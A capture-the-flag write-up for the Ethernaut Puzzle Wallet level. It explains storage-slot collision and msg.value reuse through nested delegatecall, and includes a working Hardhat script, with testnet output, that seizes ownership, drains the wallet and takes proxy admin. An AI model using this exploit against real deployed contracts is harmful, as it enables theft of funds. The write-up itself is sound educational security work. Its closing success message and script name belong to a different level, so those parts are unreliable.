---
title: Ethernaut #24 Puzzle Wallet
tags: [ethernaut]
style: border
color: primary
description: Ethernaut PuzzleWallet challenge writeup
---

## Puzzle Wallet

### Challenge

Nowadays, paying for DeFi operations is impossible, fact.

A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this.

They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.

Little did they know, their lunch money was at risk…

You'll need to hijack this wallet to become the admin of the proxy.

Things that might help::

* Understanding how `delegatecall`s work and how `msg.sender` and `msg.value` behaves when performing one.
* Knowing about proxy patterns and the way they handle storage variables.


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "@openzeppelin/contracts/proxy/UpgradeableProxy.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) public {
        admin = _admin;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    using SafeMath for uint256;
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] = balances[msg.sender].add(msg.value);
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] = balances[msg.sender].sub(value);
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```

### Background

This is probably the challange I spent most time on up until now. In order to pass this challange we need to keep in mind that `delegatecall` keeps the context of the caller. This includes the `msg.sender` and `msg.value`. This is very interesting and very different than a normal `call` which would have a new `msg.sender` and `msg.value` associated with them. In a normal `call` a new `msg.value` would be sent along, in a `delegatecall` however, the same `msg.value` would be used and hence could potentially act as if it was received twice. The other important thing to note here is how the slots of the proxy overlap those of the implementation and can therefor be manipulated across the different implementation.

### Attack

The first vulnerability is pretty straight forward to exploit. The `pendingAdmin` and `admin` variable slots in the proxy overlap those of the `owner` and `maxBalance` in the implementation respectively. Since anyone can propose a new admin we can change the `pendingAdmin` in the proxy and as a result change the `owner` in the implementation. Using this technique we can set our own address as the `owner` and then also add our address in the whitelist by calling the `addToWhitelist`. This allows us to bypass the `onlyWhitelisted` modifier and unlocks some new functions for us.

Now all I needed to do is set the `maxBalance` variable to my account address which overlaps the `admin` variable in the proxy contract. The only way to do this is by calling the `init` function or the `setMaxBalance` function. Both functions have a require that will normally `revert`. The `init` function will `revert` if the `maxBalance` is not zero, and the `setMaxBalance` will `revert` if the actual balance is not zero. Since I need to manipulate `maxBalance` to call `init` to manipulate `maxBalance` this approach did not look very promissing. So my focus was on draining the contract balance.

The only way to take funds out of the contract is by calling the execute function, which limits the amount one can take to the recoreded balance. So the balance of the contract is `0.001 ETH` and the recorded balance of account address is `0`. I need to find a way to record at least as much in my balance as the funds in the contract. 

The second vulnerability is not that obvious but the hints make it pretty clear were to look, the `multicall` function `delegatecall`s to the contract its self. The `multicall` function allows us to call multiple functions in the same transaction by providing multiple `calldata` in an array. The reason I spent so much time on this was because I just couldn't see a way to exploit this vulnerability. The comment `// Protect against reusing msg.value` was an obvious hint but I just started falling into a rabbit-hole. I started looking if I could trigger the `execute` function with such data that it would call the `deposit` again or other combinations but it just didn't get anywhere and some scenarios were getting a bit too complex. I think I was drawn into this rabbit-hole because I thought the `data` argument in the call was placed intentionally to make this exercise possible (hint it was not). I also started looking into whether I could call the same function in the proxy contract as someone else but it was just not getting anywhere.

The course of action was kind of clear though. I needed to find a way to deposit the `msg.value` more than once wihtout sending it as many times. If no checks were in place I could simply `deposit` twice and since a `delegatecall` was made the same `msg.value` would be used (without actually resending) the funds. The balance however would be increased twice. The contract though, had some logic to avoid this. Specifically it uses a local variable in the `multicall` function that makes sure the `deposit` is only called once. So it won't be that easy.

And then in occured to me, I could `delegatecall` to the `multicall` function its self, creating a new stack frame with new `depositCalled` initialized to `false`. So all I had to do was to provide two calls to the `multicall` function. The first is a `deposit` function, and then a call to `multicall` which would have a single call to `deposit` once more. 

* Call `proposeNewAdmin` on proxy with the account address to set the `owner` on the implementation
* Call `addToWhitelist` on the implementation with the account address to add the account in the whitelist
* Generate the `calldata` for the `deposit` function
* Generate the `calldata` for the `multicall` functino with arguments an array with only the `deposit` `calldata` generated in the previous step
* Call `multicall` with an array with the `deposit` `calldata` and the `multicall` `calldata` and send a value equal to the funds of the contract
* Call `execute` and withdraw the full amount of the contract
* Call `setMaxBalance` with the account address to set the `admin` on the proxy


#### king-solve.js

```javascript
const hre = require("hardhat");
const { ethers, upgrades } = require("hardhat");

async function printState(proxy, contract, account) {
    console.log("Proxy pendingAdmin: " + await proxy.pendingAdmin())
    console.log("Proxy admin       : " + await proxy.admin())
    console.log("Wallet owner      : " + await contract.owner())
    console.log("Wallet maxBalance : " + await contract.maxBalance())
    console.log("Wallet Balance    : " + await ethers.provider.getBalance(contract.address))
    console.log("Account Balance   : " + await contract.balances(account.address))
    console.log("")
}

async function main() {
    puzzleWalletAddress = "0x0191F190ADFdE3C418D9742d8b0C80Ca57e4Ec4e";
    contract = await ethers.getContractAt("PuzzleWallet", puzzleWalletAddress);

    const accounts = await hre.ethers.getSigners();
    account = accounts[0];

    console.log("Level address: " + contract.address)
    console.log("")

    proxy = await ethers.getContractAt("PuzzleProxy", puzzleWalletAddress);
    

    await printState(proxy, contract, account)

    // set pendingAdmin in PuzzleProxy which overlaps owner in PuzzleWallet slot to account address 
    tx = await proxy.connect(account).proposeNewAdmin(account.address)
    receipt = await tx.wait()

    await printState(proxy, contract, account)

    // add account address to whitelist
    tx = await contract.connect(account).addToWhitelist(account.address)
    receipt = await tx.wait()

    // prepare double deposit with single value
    depositCallData = contract.interface.encodeFunctionData("deposit")
    multicallCallData = contract.interface.encodeFunctionData("multicall", [[depositCallData]])

    contractBalance = await ethers.provider.getBalance(contract.address)

    // execute double deposit with single value
    tx = await contract.connect(account).multicall([depositCallData, multicallCallData], {value: contractBalance})
    receipt = await tx.wait()

    await printState(proxy, contract, account)

    // drain wallet from funds to unlock setMaxBalance functionality
    contractBalance = await ethers.provider.getBalance(contract.address)
    tx = await contract.connect(account).execute(account.address, contractBalance, "0x")
    receipt = await tx.wait()

    await printState(proxy, contract, account)

    // set maxBalance in PuzzleWallet which overlaps admin slot in PuzzleProxy to account address
    tx = await contract.connect(account).setMaxBalance(account.address)
    receipt = await tx.wait()

    await printState(proxy, contract, account)
    
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
```

```bash
$ npx hardhat run scripts/puzzle-wallet-solve.js --network rinkeby
Level address: 0x0191F190ADFdE3C418D9742d8b0C80Ca57e4Ec4e
Proxy pendingAdmin: 0xe13a4a46C346154C41360AAe7f070943F67743c9
Proxy admin       : 0xe13a4a46C346154C41360AAe7f070943F67743c9
Wallet owner      : 0xe13a4a46C346154C41360AAe7f070943F67743c9
Wallet maxBalance : 1285822837045366655748890655763751218771536593865
Wallet Balance    : 1000000000000000
Account Balance   : 0

Proxy pendingAdmin: 0x11bAe9eA1851939a485f1F00b7B0Eec099e9276d
Proxy admin       : 0xe13a4a46C346154C41360AAe7f070943F67743c9
Wallet owner      : 0x11bAe9eA1851939a485f1F00b7B0Eec099e9276d
Wallet maxBalance : 1285822837045366655748890655763751218771536593865
Wallet Balance    : 1000000000000000
Account Balance   : 0

Proxy pendingAdmin: 0x11bAe9eA1851939a485f1F00b7B0Eec099e9276d
Proxy admin       : 0xe13a4a46C346154C41360AAe7f070943F67743c9
Wallet owner      : 0x11bAe9eA1851939a485f1F00b7B0Eec099e9276d
Wallet maxBalance : 1285822837045366655748890655763751218771536593865
Wallet Balance    : 2000000000000000
Account Balance   : 2000000000000000

Proxy pendingAdmin: 0x11bAe9eA1851939a485f1F00b7B0Eec099e9276d
Proxy admin       : 0xe13a4a46C346154C41360AAe7f070943F67743c9
Wallet owner      : 0x11bAe9eA1851939a485f1F00b7B0Eec099e9276d
Wallet maxBalance : 1285822837045366655748890655763751218771536593865
Wallet Balance    : 0
Account Balance   : 0

Proxy pendingAdmin: 0x11bAe9eA1851939a485f1F00b7B0Eec099e9276d
Proxy admin       : 0x11bAe9eA1851939a485f1F00b7B0Eec099e9276d
Wallet owner      : 0x11bAe9eA1851939a485f1F00b7B0Eec099e9276d
Wallet maxBalance : 101221158531952969135484184365980688453888190317
Wallet Balance    : 0
Account Balance   : 0
```

### Success Message

Most of Ethernaut's levels try to expose (in an oversimplified form of course) something that actually happened — a real hack or a real bug.

In this case, see: [King of the Ether](https://www.kingoftheether.com/thrones/kingoftheether/index.html) and [King of the Ether Postmortem](http://www.kingoftheether.com/postmortem.html).
